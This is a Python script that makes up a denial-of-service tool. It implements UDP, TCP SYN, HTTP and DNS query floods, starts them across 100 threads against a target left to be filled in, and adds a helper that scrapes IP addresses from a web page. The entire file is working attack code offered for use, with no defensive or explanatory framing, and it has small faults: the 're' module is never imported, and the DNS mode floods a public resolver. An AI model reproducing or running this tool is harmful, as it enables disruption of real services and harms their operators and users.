import socket
import threading
import requests
import random
import time
from scapy.all import *
from urllib.parse import urlparse

# Function to perform a UDP flood attack
def udp_flood(target_ip, port, duration):
    print(f"Starting UDP flood attack on {target_ip}:{port} for {duration} seconds.")
    end_time = time.time() + duration
    while time.time() < end_time:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b'\x00' * 1024, (target_ip, port))
        sock.close()

# Function to perform a TCP SYN flood attack
def tcp_syn_flood(target_ip, port, duration):
    print(f"Starting TCP SYN flood attack on {target_ip}:{port} for {duration} seconds.")
    end_time = time.time() + duration
    while time.time() < end_time:
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)

# Function to perform an HTTP flood attack
def http_flood(target_url, duration):
    print(f"Starting HTTP flood attack on {target_url} for {duration} seconds.")
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            response = requests.get(target_url)
        except requests.exceptions.RequestException:
            pass

# Function to perform a DNS query flood attack
def dns_query_flood(target_domain, dns_server, duration):
    print(f"Starting DNS query flood attack on {target_domain} using {dns_server} for {duration} seconds.")
    end_time = time.time() + duration
    while time.time() < end_time:
        dns_packet = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=target_domain, qtype='A'))
        send(dns_packet, verbose=0)

# Function to pull IP addresses from a target URL
def pull_ip_addresses(target_url):
    print(f"Pulling IP addresses from {target_url}.")
    response = requests.get(target_url)
    ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', response.text)
    return ips

# Function to perform a DDoS attack with multiple threads
def ddos_attack(target, port, duration, threads, attack_type):
    print(f"Starting DDoS attack on {target}:{port} with {threads} threads for {duration} seconds using {attack_type} attack.")
    if attack_type == "udp":
        for _ in range(threads):
            threading.Thread(target=udp_flood, args=(target, port, duration)).start()
    elif attack_type == "tcp":
        for _ in range(threads):
            threading.Thread(target=tcp_syn_flood, args=(target, port, duration)).start()
    elif attack_type == "http":
        for _ in range(threads):
            threading.Thread(target=http_flood, args=(target, duration)).start()
    elif attack_type == "dns":
        dns_server = "8.8.8.8"  # Google's public DNS server
        for _ in range(threads):
            threading.Thread(target=dns_query_flood, args=(target, dns_server, duration)).start()
    else:
        print("Invalid attack type specified.")

# Example usage
if __name__ == "__main__":
    target_ip = 'example.com'  # Replace with the target IP or domain
    port = 80  # Replace with the target port
    duration = 60  # Attack duration in seconds
    threads = 100  # Number of threads for the attack
    attack_type = 'udp'  # Choose from 'udp', 'tcp', 'http', 'dns'

    ddos_attack(target_ip, port, duration, threads, attack_type)

    # Pull IP addresses from a target URL
    target_url = 'http://example.com'  # Replace with the target URL
    ips = pull_ip_addresses(target_url)
    print("Extracted IP addresses:", ips)